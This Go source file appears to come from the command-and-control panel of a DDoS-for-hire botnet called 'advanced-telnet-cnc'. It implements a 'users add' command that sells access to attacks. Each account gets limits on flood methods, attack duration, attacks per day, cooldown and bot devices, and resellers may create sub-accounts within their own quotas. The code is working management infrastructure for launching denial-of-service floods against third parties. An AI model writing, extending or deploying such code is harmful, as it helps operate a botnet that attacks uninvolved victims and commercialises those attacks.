package subcommands

import (
	"advanced-telnet-cnc/packages/duration"
	"advanced-telnet-cnc/packages/pflag"
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/database"
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
	"errors"
	"fmt"
	"strconv"
	"time"
)

func init() {
	command.Subcommand("users", &command.SubCommand{
		Aliases:   []string{"create", "add"},
		Arguments: []command.Argument{{"username", false}, {"password", false}, {"options", true}},
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session, parent *command.Command) error {
			if len(args[0]) < 3 || len(args[1]) < 3 {
				return session.CmdError(errors.New("username and password must be at least 3 characters long"))
			}

			var user = &database.UserProfile{
				Name:       args[0],
				Password:   args[1],
				Methods:    []int{-1},
				Cooldown:   60,
				MaxTime:    60,
				MaxAttacks: 50,
				Devices:    -1,
				Admin:      false,
				Reseller:   false,
			}

			var expiry string

			flagSet := pflag.NewFlagSet("users create", pflag.ContinueOnError)
			flagSet.SetOutput(session.Conn)

			flagSet.StringVarP(&expiry, "expiry", "e", "1d", "Expiry of the users plan")

			// Only admins are allowed to use the admin & reseller flags.
			if session.UserProfile.Admin {
				flagSet.BoolVarP(&user.Admin, "admin", "a", user.Admin, "Allows the user to execute administrative commands")
				flagSet.BoolVarP(&user.Reseller, "reseller", "r", user.Reseller, "Allows the user to execute commands like 'users add'")
			}

			flagSet.IntVarP(&user.Devices, "devices", "d", user.Devices, "The devices the user has access to")
			flagSet.IntVarP(&user.Cooldown, "cooldown", "c", user.Cooldown, "The cooldown the user has after an attack")
			flagSet.IntVarP(&user.MaxTime, "time", "t", user.MaxTime, "The maximum attack duration the user has")
			flagSet.IntVarP(&user.MaxAttacks, "attacks", "f", user.MaxAttacks, "The maximum attacks the user has per day")
			flagSet.IntSliceVarP(&user.Methods, "methods", "m", user.Methods, "Floods the user has access to")

			err := flagSet.Parse(args[2:])
			if err != nil {
				if err == pflag.ErrHelp {
					return nil
				}

				return session.CmdError(err)
			}

			// Prevent standard resellers from creating an account with parameters that exceed their own limits
			if !session.UserProfile.Admin {
				if user.Devices < 0 || user.Devices > session.UserProfile.Devices {
					user.Devices = session.UserProfile.Devices
				}
				if user.MaxTime <= 0 || user.MaxTime > session.UserProfile.MaxTime {
					user.MaxTime = session.UserProfile.MaxTime
				}
				if user.MaxAttacks <= 0 || user.MaxAttacks > session.UserProfile.MaxAttacks {
					user.MaxAttacks = session.UserProfile.MaxAttacks
				}
				if user.Cooldown < session.UserProfile.Cooldown {
					user.Cooldown = session.UserProfile.Cooldown
				}

				// Method restrictions
				resellerHasAll := false
				for _, rm := range session.UserProfile.Methods {
					if rm == -1 {
						resellerHasAll = true
						break
					}
				}
				if !resellerHasAll {
					userIsAll := false
					for _, um := range user.Methods {
						if um == -1 {
							userIsAll = true
							break
						}
					}
					if userIsAll {
						user.Methods = make([]int, len(session.UserProfile.Methods))
						copy(user.Methods, session.UserProfile.Methods)
					} else {
						var valid []int
						for _, um := range user.Methods {
							for _, rm := range session.UserProfile.Methods {
								if um == rm {
									valid = append(valid, um)
									break
								}
							}
						}
						user.Methods = valid
					}
				}
			}

			durationParsed, err := duration.ModifiedParseDuration(expiry)
			if err != nil {
				return session.CmdError(err)
			}

			user.Expiry = time.Now().Add(durationParsed)

			err = database.CreateUser(user, true)
			if err != nil {
				if err == database.ErrKnownUser {
					return session.CmdError(errors.New(fmt.Sprintf("failed to add user to the database because a user with the name %s already exists.", strconv.Quote(user.Name))))
				}

				return session.CmdError(errors.New("an internal database error occurred while adding the user"))
			}

			return session.Printf("%sSuccessfully added %s into the database.\r\n", config.Green, strconv.Quote(user.Name))
		},
	})
}
